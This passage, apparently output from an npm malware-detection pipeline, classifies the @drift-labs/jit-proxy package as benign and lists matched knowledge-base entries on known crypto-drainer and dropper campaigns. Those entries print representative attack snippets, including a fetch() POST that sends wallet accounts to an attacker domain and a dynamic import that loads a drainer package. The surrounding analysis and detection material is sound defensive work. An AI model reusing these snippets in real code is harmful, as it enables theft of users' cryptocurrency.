@@ -1,0 +1,1504 @@
+{
+  "package_name": "@drift-labs##jit-proxy",
+  "package_version": "0.16.2",
+  "label": "benign",
+  "detection_time": "2026-05-26T16:53:08.316234",
+  "status": "success",
+  "selected_files_count": 7,
+  "selected_files": [
+    "package/package.json",
+    "package/lib/index.js",
+    "package/lib/jitProxyClient.js",
+    "package/lib/jitter/baseJitter.js",
+    "package/lib/jitter/jitterShotgun.js",
+    "package/lib/jitter/jitterSniper.js",
+    "package/lib/types/jit_proxy.js"
+  ],
+  "is_malicious": false,
+  "total_files": 7,
+  "malicious_files": 0,
+  "total_slices": 3,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@drift-labs##jit-proxy/0.16.2/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@drift-labs##jit-proxy/0.16.2/package/lib/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@drift-labs##jit-proxy/0.16.2/package/lib/jitProxyClient.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@drift-labs##jit-proxy/0.16.2/package/lib/jitter/baseJitter.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "baseJitter_slice_1",
+          "code_snippet": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.BaseJitter = void 0;\nconst web3_js_1 = require(\"@solana/web3.js\");\nconst sdk_1 = require(\"@drift-labs/sdk\");\nconst tweetnacl_util_1 = require(\"tweetnacl-util\");\nclass BaseJitter {\n    constructor({ auctionSubscriber, jitProxyClient, driftClient, userStatsMap, swiftOrderSubscriber, slotSubscriber, auctionSubscriberIgnoresSwiftOrders, }) {\n        this.perpParams = new Map();\n        this.spotParams = new Map();\n        this.seenOrders = new Set();\n        this.onGoingAuctions = new Map();\n        this.auctionSubscriber = auctionSubscriber;\n        this.driftClient = driftClient;\n        this.jitProxyClient = jitProxyClient;\n        this.userStatsMap =\n            userStatsMap ||\n                new sdk_1.UserStatsMap(this.driftClient, new sdk_1.BulkAccountLoader(this.driftClient.connection, 'confirmed', 0));\n        this.slotSubscriber = slotSubscriber;\n        this.swiftOrderSubscriber = swiftOrderSubscriber;\n        this.auctionSubscriberIgnoresSwiftOrders =\n            auctionSubscriberIgnoresSwiftOrders;\n        if (this.swiftOrderSubscriber && !this.slotSubscriber) {\n            throw new Error('Slot subscriber is required for signedMsg order subscriber');\n        }\n        if (!this.swiftOrderSubscriber.userAccountGetter) {\n            throw new Error('User account getter is required in swift order subscriber for jit integration');\n        }\n    }\n    async subscribe() {\n        var _a, _b;\n        await this.driftClient.subscribe();\n        await this.auctionSubscriber.subscribe();\n        this.auctionSubscriber.eventEmitter.on('onAccountUpdate', async (taker, takerKey, slot) => {\n            const takerKeyString = takerKey.toBase58();\n            const takerStatsKey = (0, sdk_1.getUserStatsAccountPublicKey)(this.driftClient.program.programId, taker.authority);\n            for (const order of taker.orders) {\n                if (!(0, sdk_1.isVariant)(order.status, 'open')) {\n                    continue;\n                }\n                if (!(0, sdk_1.hasAuctionPrice)(order, slot)) {\n                    continue;\n                }\n                if (this.auctionSubscriberIgnoresSwiftOrders &&\n                    (0, sdk_1.isSignedMsgOrder)(order)) {\n                    continue;\n                }\n                if (this.userFilter) {\n                    if (this.userFilter(taker, takerKeyString, order)) {\n                        return;\n                    }\n                }\n                const orderSignature = this.getOrderSignatures(takerKeyString, order.orderId);\n                if (this.seenOrders.has(orderSignature)) {\n                    continue;\n                }\n                this.seenOrders.add(orderSignature);\n                if (this.onGoingAuctions.has(orderSignature)) {\n                    continue;\n                }\n                if ((0, sdk_1.isVariant)(order.marketType, 'perp')) {\n                    if (!this.perpParams.has(order.marketIndex)) {\n                        return;\n                    }\n                    const perpMarketAccount = this.driftClient.getPerpMarketAccount(order.marketIndex);\n                    if (order.baseAssetAmount\n                        .sub(order.baseAssetAmountFilled)\n                        .lte(perpMarketAccount.amm.minOrderSize)) {\n                        return;\n                    }\n                    const promise = this.createTryFill(taker, takerKey, takerStatsKey, order, orderSignature).bind(this)();\n                    this.onGoingAuctions.set(orderSignature, promise);\n                }\n                else {\n                    if (!this.spotParams.has(order.marketIndex)) {\n                        return;\n                    }\n                    const spotMarketAccount = this.driftClient.getSpotMarketAccount(order.marketIndex);\n                    if (order.baseAssetAmount\n                        .sub(order.baseAssetAmountFilled)\n                        .lte(spotMarketAccount.minOrderSize)) {\n                        return;\n                    }\n                    const promise = this.createTryFill(taker, takerKey, takerStatsKey, order, orderSignature).bind(this)();\n                    this.onGoingAuctions.set(orderSignature, promise);\n                }\n            }\n        });\n        await ((_a = this.slotSubscriber) === null || _a === void 0 ? void 0 : _a.subscribe());\n        await ((_b = this.swiftOrderSubscriber) === null || _b === void 0 ? void 0 : _b.subscribe(async (orderMessageRaw, signedMessage, isDelegateSigner) => {\n            var _a, _b, _c, _d, _e, _f, _g;\n            const signedMsgOrderParams = signedMessage.signedMsgOrderParams;\n            if (!signedMsgOrderParams.auctionDuration ||\n                !signedMsgOrderParams.auctionStartPrice ||\n                !signedMsgOrderParams.auctionEndPrice) {\n                return;\n            }\n            if (signedMsgOrderParams.baseAssetAmount.eq(sdk_1.ZERO)) {\n                return;\n            }\n            const signedMsgOrderParamsBufHex = Buffer.from(orderMessageRaw['order_message']);\n            const takerAuthority = new web3_js_1.PublicKey(orderMessageRaw['taker_authority']);\n            const signingAuthority = new web3_js_1.PublicKey(orderMessageRaw['signing_authority']);\n            const takerUserPubkey = isDelegateSigner\n                ? signedMessage.takerPubkey\n                : await (0, sdk_1.getUserAccountPublicKey)(this.driftClient.program.programId, takerAuthority, signedMessage.subAccountId);\n            const takerUserPubkeyString = takerUserPubkey.toBase58();\n            const takerUserAccount = await this.swiftOrderSubscriber.userAccountGetter.mustGetUserAccount(takerUserPubkey.toString());\n            const orderSlot = Math.min(signedMessage.slot.toNumber(), this.slotSubscriber.getSlot());\n            /**\n             * Base asset amount equalling u64::max is a special case that signals to program\n             * to bring taker to max leverage. Program will calculate the max base asset amount to do this\n             * once the tx lands on chain.\n             *\n             * You will see this is base asset amount is ffffffffffffffff\n             */\n            const signedMsgOrder = {\n                status: sdk_1.OrderStatus.OPEN,\n                orderType: signedMsgOrderParams.orderType,\n                orderId: this.convertUuidToNumber(orderMessageRaw['uuid']),\n                slot: new sdk_1.BN(orderSlot),\n                marketIndex: signedMsgOrderParams.marketIndex,\n                marketType: sdk_1.MarketType.PERP,\n                baseAssetAmount: signedMsgOrderParams.baseAssetAmount,\n                auctionDuration: signedMsgOrderParams.auctionDuration,\n                auctionStartPrice: signedMsgOrderParams.auctionStartPrice,\n                auctionEndPrice: signedMsgOrderParams.auctionEndPrice,\n                immediateOrCancel: (_a = signedMsgOrderParams.immediateOrCancel) !== null && _a !== void 0 ? _a : false,\n                direction: signedMsgOrderParams.direction,\n                postOnly: false,\n                oraclePriceOffset: (_b = signedMsgOrderParams.oraclePriceOffset) !== null && _b !== void 0 ? _b : 0,\n                maxTs: (_c = signedMsgOrderParams.maxTs) !== null && _c !== void 0 ? _c : sdk_1.ZERO,\n                reduceOnly: (_d = signedMsgOrderParams.reduceOnly) !== null && _d !== void 0 ? _d : false,\n                triggerCondition: (_e = signedMsgOrderParams.triggerCondition) !== null && _e !== void 0 ? _e : sdk_1.OrderTriggerCondition.ABOVE,\n                price: (_f = signedMsgOrderParams.price) !== null && _f !== void 0 ? _f : sdk_1.ZERO,\n                userOrderId: (_g = signedMsgOrderParams.userOrderId) !== null && _g !== void 0 ? _g : 0,\n                // Rest are not necessary and set for type conforming\n                existingPositionDirection: sdk_1.PositionDirection.LONG,\n                triggerPrice: sdk_1.ZERO,\n                baseAssetAmountFilled: sdk_1.ZERO,\n                quoteAssetAmountFilled: sdk_1.ZERO,\n                quoteAssetAmount: sdk_1.ZERO,\n                bitFlags: 0,\n                postedSlotTail: 0,\n            };\n            if (this.userFilter) {\n                if (this.userFilter(takerUserAccount, takerUserPubkeyString, signedMsgOrder)) {\n                    return;\n                }\n            }\n            const orderSignature = this.getOrderSignatures(takerUserPubkeyString, signedMsgOrder.orderId);\n            if (this.seenOrders.has(orderSignature)) {\n                return;\n            }\n            this.seenOrders.add(orderSignature);\n            if (this.onGoingAuctions.has(orderSignature)) {\n                return;\n            }\n            if (!this.perpParams.has(signedMsgOrder.marketIndex)) {\n                return;\n            }\n            const perpMarketAccount = this.driftClient.getPerpMarketAccount(signedMsgOrder.marketIndex);\n            if (signedMsgOrder.baseAssetAmount.lt(perpMarketAccount.amm.minOrderSize)) {\n                return;\n            }\n            const promise = this.createTrySignedMsgFill(signingAuthority, {\n                orderParams: signedMsgOrderParamsBufHex,\n                signature: Buffer.from(orderMessageRaw['order_signature'], 'base64'),\n            }, (0, tweetnacl_util_1.decodeUTF8)(orderMessageRaw['uuid']), takerUserAccount, takerUserPubkey, (0, sdk_1.getUserStatsAccountPublicKey)(this.driftClient.program.programId, takerUserAccount.authority), signedMsgOrder, orderSignature, orderMessageRaw['market_index']).bind(this)();\n            this.onGoingAuctions.set(orderSignature, promise);\n        }));\n    }\n    createTryFill(taker, takerKey, takerStatsKey, order, orderSignature) {\n        throw new Error('Not implemented');\n    }\n    createTrySignedMsgFill(authorityToUse, signedMsgOrderParams, uuid, taker, takerKey, takerStatsKey, order, orderSignature, marketIndex) {\n        throw new Error('Not implemented');\n    }\n    deleteOnGoingAuction(orderSignature) {\n        this.onGoingAuctions.delete(orderSignature);\n        this.seenOrders.delete(orderSignature);\n    }\n    getOrderSignatures(takerKey, orderId) {\n        return `${takerKey}-${orderId}`;\n    }\n    convertUuidToNumber(uuid) {\n        return uuid\n            .split('')\n            .reduce((n, c) => n * 64 +\n            '_~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'.indexOf(c), 0);\n    }\n    updatePerpParams(marketIndex, params) {\n        this.perpParams.set(marketIndex, params);\n    }\n    updateSpotParams(marketIndex, params) {\n        this.spotParams.set(marketIndex, params);\n    }\n    setUserFilter(userFilter) {\n        this.userFilter = userFilter;\n    }\n    setComputeUnits(computeUnits) {\n        this.computeUnits = computeUnits;\n    }\n    setComputeUnitsPrice(computeUnitsPrice) {\n        this.computeUnitsPrice = computeUnitsPrice;\n    }\n}\nexports.BaseJitter = BaseJitter;\n",
+          "is_malicious": false,
+          "malice_score": 0.4533417224884033,
+          "confidence": 0.1,
+          "behavior_summary": "Upon receiving account update events and signed message orders, the code accesses and processes order data using cryptographic public keys (via @solana/web3.js) and SDK utilities, filters orders based on status and auction parameters, and manages ongoing auction promises. It decodes base64-encoded order signatures and buffers, constructs order objects, and invokes asynchronous fill attempts via unimplemented methods. This behavior involves sensitive cryptographic data handling and order state management, facilitating automated trading actions but does not perform network, file, or system execution operations directly.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a TypeScript/JavaScript class designed to handle auction-based order processing on the Solana blockchain using legitimate SDKs and cryptographic utilities. It subscribes to account updates and signed message orders, filters and manages orders, and prepares asynchronous fill attempts. While it handles sensitive cryptographic data and order state, it does not perform any network exfiltration, wallet connection, transaction signing, or unauthorized asset transfers. The code lacks any dynamic imports of suspicious packages, obfuscation, or direct wallet manipulation. Compared to the known malicious patterns, which involve wallet draining, unauthorized transaction creation, or dynamic malicious payload loading, this code is a typical backend or middleware component for automated trading or order management. The presence of unimplemented methods suggests it is a base class intended for extension, not a standalone malicious payload.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205532_426003_snippet_1",
+              "source_package": "samplePackage (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205532_426003/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4946713447570801,
+              "code_similarity": 0.4174412190914154,
+              "behavior_similarity": 0.5719015002250671,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"solanaWeb3.Connection\"\n\"solanaWeb3.LAMPORTS_PER_SOL\"\n\"solanaWeb3.PublicKey.findProgramAddress\"\n\"solanaWeb3.SystemProgram.transfer\"\n\"solanaWeb3.Transaction\"\n\"async function info(\"\n\"async function updateConnectText(\"\n\"async function updateMintText(\"\n\"async function start(\"\n\"async function connect(\"\n\"async function waitForWalletConnection(\"\n\"async function connectSolana(\"\n\"async function getTokenBalance(\"\n\"async function createTxs(\"\n\"async function createPrizeTxs(\"\n\"async function claim(\"\n\"async function createTokenTxs(\"\n\"async function claimSolana(\"\n\".phantom\"\n\".isphantom\"\n\"phantom.app\"\n\".AccountLayout.\"\n\".TOKEN_PROGRAM_ID.\"\n\".Token.createAssociatedTokenAccountInstruction(\"\n\".Token.createTransferInstruction(\"",
+                "code_behavior": "At runtime, the code invokes multiple asynchronous functions to interact with Solana Web3 APIs, establishes wallet connections, creates and signs transactions, and manipulates wallet data, resulting in unauthorized access to user wallets and potential exfiltration of cryptocurrency.",
+                "malice_analysis": {
+                  "why_suspicious": "The code includes numerous routines for connecting to cryptocurrency wallets, creating and signing transactions, and referencing the Phantom wallet provider. These are strong indicators of attempts to access and manipulate user wallets without consent, a hallmark of crypto-stealing malware.",
+                  "violated_expectations": "Legitimate npm packages should not implement wallet connection or transaction creation logic unless they are explicitly designed as wallet management or blockchain interaction tools. The presence of these routines in a package not intended for such purposes is a clear violation.",
+                  "similar_legitimate_use": "Legitimate dApps or wallet utilities may use similar APIs and functions, but only when their documented purpose is to manage wallets or interact with blockchains, and with explicit user consent.",
+                  "key_indicators": [
+                    "Multiple async functions for wallet connection and transaction creation (e.g., connectSolana, createTxs, claimSolana)",
+                    "Direct references to Solana Web3 APIs and Phantom wallet (e.g., solanaWeb3.Connection, .phantom, phantom.app)",
+                    "Transaction manipulation routines (e.g., SystemProgram.transfer, Token.createTransferInstruction)",
+                    "Patterns matching YARA rules for known crypto-stealer campaigns"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "JavaScript source files (detected by YARA rule 'clinksink')",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "samplePackage",
+                  "package_manager": "npm",
+                  "package_versions": "unspecified (example in report)",
+                  "why_malicious": "The package contains code patterns and behaviors directly associated with cryptocurrency theft and credential exfiltration. It leverages Solana Web3 functions for unauthorized wallet access and transaction manipulation, accesses browser credential databases for data theft, and employs DLL hijacking for arbitrary code execution and persistence. These behaviors are detected by custom YARA rules and match known indicators of active malicious campaigns."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious JavaScript code initializes wallet connection routines and monitors for user wallet activity.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for unauthorized transaction creation and possible fund exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Python code accesses local browser credential databases and extracts sensitive login data.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted credentials or wallet information is exfiltrated to attacker-controlled infrastructure.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains access to user credentials or cryptocurrency funds."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious DLL is executed via rundll32.exe, enabling further code execution or persistence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker achieves code execution, persistence, or lateral movement."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code in npm packages implementing multiple asynchronous wallet connection and transaction functions referencing Solana Web3 and Phantom wallet APIs",
+                    "Python code accessing browser credential SQLite databases (e.g., 'browser_credentials.db', 'logins' table) and exfiltrating data via HTTP POST",
+                    "Execution of DLLs via rundll32.exe with non-standard or suspicious DLL filenames (DLL hijacking technique)"
+                  ],
+                  "file_indicators": [
+                    "JavaScript files containing references to 'solanaWeb3', 'phantom.app', or wallet connection routines",
+                    "Python files importing sqlite3 and accessing files named 'browser_credentials.db' or querying 'logins' tables",
+                    "Presence or execution of 'rundll32.exe' with DLLs not part of the standard system or application installation"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS POST requests containing credential or wallet data to unknown or suspicious domains",
+                    "Network connections initiated by JavaScript or Python code to attacker-controlled infrastructure for data exfiltration"
+                  ],
+                  "how_to_detect": "Monitor npm packages for JavaScript code that implements multiple asynchronous wallet connection and transaction routines, especially those referencing Solana Web3 and Phantom wallet APIs. Flag Python packages that access browser credential SQLite databases and attempt to transmit their contents externally via HTTP POST. Detect any use of rundll32.exe to execute DLLs not part of the standard system or application installation. Correlate these behaviors with outbound network activity to unknown or suspicious domains to identify coordinated credential or cryptocurrency theft."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102926_037825_snippet_2",
+              "source_package": "@ledgerhq/connect-kit (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102926_037825/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4455093741416931,
+              "code_similarity": 0.4405788481235504,
+              "behavior_similarity": 0.4504398703575134,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode representation based on report\nimport('2e6d5f64604be31').then(drainer => drainer.init());",
+                "code_behavior": "At import-time or during package initialization, the code dynamically imports and executes a secondary npm package (2e6d5f64604be31), which acts as a crypto drainer, enabling further malicious actions such as wallet draining and unauthorized asset transfers.",
+                "malice_analysis": {
+                  "why_suspicious": "The code dynamically downloads and executes an unlisted, suspiciously named secondary package at runtime, a common technique for evading static analysis and delivering malware payloads.",
+                  "violated_expectations": "Legitimate packages should not download or execute arbitrary code from external, unvetted sources at runtime, especially without user awareness or consent.",
+                  "similar_legitimate_use": "Dynamic imports are used in legitimate plugin systems, but only from trusted, well-known sources and never for unlisted or obfuscated packages.",
+                  "key_indicators": [
+                    "Dynamic import of a non-standard, suspiciously named package (2e6d5f64604be31)",
+                    "No user notification or consent for code execution",
+                    "Obfuscation of malicious payload delivery via secondary package",
+                    "Presence of code that enables further malicious actions after import"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (import-time or during package initialization)",
+                  "file_location": "main application code (in @ledgerhq/connect-kit v1.1.5 and v1.1.6)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@ledgerhq/connect-kit",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.5, 1.1.6, 1.1.7",
+                  "why_malicious": "Versions 1.1.5, 1.1.6, and 1.1.7 of @ledgerhq/connect-kit were compromised to include or download crypto drainer malware. The malicious code is designed to either directly or indirectly execute unauthorized transactions, stealing cryptocurrency from users' wallets. The attack is triggered during normal application use, presenting fake wallet connection prompts and exfiltrating assets to attacker-controlled wallets without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious versions of @ledgerhq/connect-kit are published to npm and included as dependencies in target applications.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is distributed to end-user applications via dependency installation."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When the application loads the compromised package, malicious code is executed either at import-time or during user interaction.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is presented with a fake wallet connection modal or a secondary drainer package is loaded and executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "User interacts with the fake modal and connects their wallet, or the secondary drainer package initializes.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malware initiates unauthorized transactions using the connected wallet."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware drains funds from the connected wallet to attacker-controlled addresses.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen cryptocurrency, achieving the final objective of the attack."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Display of unexpected or suspicious wallet connection modals in applications using @ledgerhq/connect-kit",
+                    "Automatic initiation of wallet transactions without explicit user consent or confirmation",
+                    "Dynamic import or download of secondary npm packages (such as 2e6d5f64604be31) at runtime",
+                    "Execution of code that interacts with browser wallet APIs outside of normal user-initiated flows"
+                  ],
+                  "file_indicators": [
+                    "Presence of @ledgerhq/connect-kit versions 1.1.5, 1.1.6, or 1.1.7 in package.json, package-lock.json, or yarn.lock",
+                    "References to package 2e6d5f64604be31 in source code or dependency trees",
+                    "Unexpected changes or additions to node_modules/@ledgerhq/connect-kit/main.js or related files"
+                  ],
+                  "network_indicators": [
+                    "Outbound cryptocurrency transactions to known attacker wallet addresses immediately following wallet connection events",
+                    "Unexpected network requests initiated during or after wallet connection flows",
+                    "Connections to domains or endpoints associated with the secondary drainer package"
+                  ],
+                  "how_to_detect": "Monitor dependency manifests (package.json, lockfiles) for the use of @ledgerhq/connect-kit versions 1.1.5, 1.1.6, or 1.1.7. Analyze application runtime for the presence of fake wallet connection modals and any unauthorized transaction initiations. Flag any dynamic imports or downloads of unlisted npm packages, especially those matching suspicious patterns (e.g., 2e6d5f64604be31). Monitor for network activity involving known attacker wallet addresses or suspicious transaction patterns immediately following wallet connection events. Review source code and built artifacts for references to secondary drainer packages or unexpected modifications to wallet connection logic."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_780352_snippet_2",
+              "source_package": "lottie-player (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780352/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42973947525024414,
+              "code_similarity": 0.3698861598968506,
+              "behavior_similarity": 0.4895928204059601,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Malicious wallet drainer logic (representative):\nwindow.ethereum.request({ method: 'eth_requestAccounts' })\n  .then(accounts => {\n    // Exfiltrate assets\n    fetch('wss://castleservices01.com', { method: 'POST', body: JSON.stringify({ accounts }) });\n    // Initiate draining transactions\n    // ...\n  });",
+                "code_behavior": "At runtime, after the user interacts with a wallet connect prompt, the code requests access to the user's web3 wallet, collects account information, sends this data to the attacker's server via WebSocket or HTTP POST, and initiates unauthorized transactions to transfer assets to attacker-controlled addresses.",
+                "malice_analysis": {
+                  "why_suspicious": "The code abuses the wallet connection process to exfiltrate sensitive wallet information and automate asset transfers, which is a hallmark of crypto drainer malware.",
+                  "violated_expectations": "A legitimate animation player should never interact with web3 wallets, prompt for wallet connections, or initiate asset transfers.",
+                  "similar_legitimate_use": "Legitimate decentralized applications (dApps) prompt for wallet connection only for transparent, user-initiated actions and never exfiltrate wallet data to untrusted domains.",
+                  "key_indicators": [
+                    "Unsolicited wallet connection prompts on non-crypto-related sites",
+                    "Use of window.ethereum.request for eth_requestAccounts outside of dApp context",
+                    "Outbound WebSocket or HTTP(S) requests to castleservices01.com or similar domains",
+                    "Automated transaction logic following wallet connection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (user interaction)",
+                  "file_location": "Injected by drainer.js (loaded at runtime)",
+                  "required_permissions": [
+                    "network",
+                    "web3 wallet access",
+                    "DOM access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "lottie-player",
+                  "package_manager": "npm",
+                  "package_versions": "2.0.5, 2.0.6, 2.0.7",
+                  "why_malicious": "Versions 2.0.5, 2.0.6, and 2.0.7 of the lottie-player npm package were compromised in a supply chain attack. The attacker injected code that loads a remote crypto drainer script, which prompts users to connect their cryptocurrency wallets and then exfiltrates assets (cryptocurrency and NFTs) to attacker-controlled addresses. This malicious behavior is unrelated to the legitimate functionality of an animation library and poses a severe risk to users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious lottie-player package is loaded by the website (via CDN or npm), triggering the import-time execution of injected code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Loads remote drainer script from attacker-controlled domain (castleservices01.com)."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The drainer script, once loaded, injects a wallet connect UI and prompts the user to connect their crypto wallet.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is deceived into connecting their wallet, granting access to wallet information."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Upon wallet connection, the script exfiltrates wallet information and initiates unauthorized transactions to steal assets.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Victim's cryptocurrency and NFTs are transferred to attacker-controlled addresses."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Dynamic script injection from domains not affiliated with LottieFiles (e.g., castleservices01.com) during import-time of lottie-player.js",
+                    "Wallet connect prompts or web3 wallet access requests on sites not expected to interact with cryptocurrency wallets",
+                    "Outbound WebSocket or HTTP(S) connections to known phishing or drainer domains (e.g., castleservices01.com) following wallet connection"
+                  ],
+                  "file_indicators": [
+                    "dist/lottie-player.js containing references to castleservices01.com or similar suspicious domains",
+                    "Presence of dynamically injected <script> elements with src attributes pointing to external drainer payloads",
+                    "Unexpected modifications or additions to lottie-player.js in npm package versions 2.0.5, 2.0.6, or 2.0.7"
+                  ],
+                  "network_indicators": [
+                    "Any network connections (HTTP, HTTPS, WebSocket) to castleservices01.com",
+                    "Outbound requests to domains with a history of crypto phishing or drainer activity after loading animation libraries"
+                  ],
+                  "how_to_detect": "Monitor for external script loads initiated by lottie-player.js, especially from domains not associated with LottieFiles. Flag any wallet connect prompts or web3 wallet access requests on sites that do not provide crypto-related functionality. Detect and alert on outbound network connections to known drainer or phishing domains (such as castleservices01.com) after loading animation libraries. Use file integrity monitoring to detect unauthorized changes or suspicious references in npm package files, particularly in dist/lottie-player.js for the affected versions."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195354_696742_snippet_6",
+              "source_package": "styled-beautify-components, port-launcher, blockchain-transactions, chainflow, cryptotransact, blockledger, erc20-testenv, puma-com, blockchaintestenv, cryptotestenv, envision-config, envi-conf, envi-config, dot-environment (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195354_696742/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4187994599342346,
+              "code_similarity": 0.38386428356170654,
+              "behavior_similarity": 0.4537346661090851,
+              "matched_snippet": {
+                "snippet_id": "snippet_6",
+                "code_snippet": "// Malicious code in serviceWorker.js\n// (Obfuscated JS that connects to wallet, attempts to transfer all ETH, and runs in background as a service worker)",
+                "code_behavior": "At runtime, the service worker script executes obfuscated JavaScript that connects to the user's crypto wallet, attempts to create and broadcast a transaction to transfer all ETH, and runs persistently in the background as a service worker, resulting in unauthorized wallet access and potential theft.",
+                "malice_analysis": {
+                  "why_suspicious": "Service workers should not initiate unauthorized wallet transactions or run obfuscated code that interacts with sensitive browser APIs. This behavior is indicative of targeted crypto theft.",
+                  "violated_expectations": "Legitimate service workers handle caching or notifications, not wallet theft or background exfiltration of funds.",
+                  "similar_legitimate_use": "None; wallet access should always be user-initiated and transparent, never automated or obfuscated.",
+                  "key_indicators": [
+                    "Obfuscated JavaScript in service worker",
+                    "Automated wallet transaction attempts",
+                    "Runs as a persistent background process"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (user runs cloned repo)",
+                  "file_location": "config/serviceWorker.js (GitHub repo: AxieMeta/Paradise)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "browser extension APIs"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "styled-beautify-components, port-launcher, blockchain-transactions, chainflow, cryptotransact, blockledger, erc20-testenv, puma-com, blockchaintestenv, cryptotestenv, envision-config, envi-conf, envi-config, dot-environment",
+                  "package_manager": "npm",
+                  "package_versions": "styled-beautify-components: 6.1.1-6.1.6; port-launcher: 16.0.3; blockchain-transactions: 5.0.3; chainflow: 5.0.3; cryptotransact: 5.0.3; blockledger: 5.0.3; erc20-testenv: 5.0.3; puma-com: 5.0.2; blockchaintestenv: 3.2.1; cryptotestenv: 3.2.1; envision-config: 0.1.3; envi-conf: 0.1.3, 0.1.0; envi-config: 0.1.0; dot-environment: 0.0.1",
+                  "why_malicious": "These packages contain malicious preinstall scripts that execute arbitrary code at install time, download and decrypt a second-stage payload from attacker-controlled infrastructure, execute it as a DLL, and then remove all traces of the attack. The attack chain is designed for stealth, persistence, and credential/data theft, and is linked to North Korean state-sponsored actors."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs a malicious npm package, triggering the preinstall script.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of index.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js writes and executes batch and PowerShell scripts to orchestrate payload delivery.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Batch file execution"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Batch file downloads encrypted payload, runs PowerShell decryption, and prepares DLL for execution.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "DLL execution"
+                  },
+                  {
+                    "step": 4,
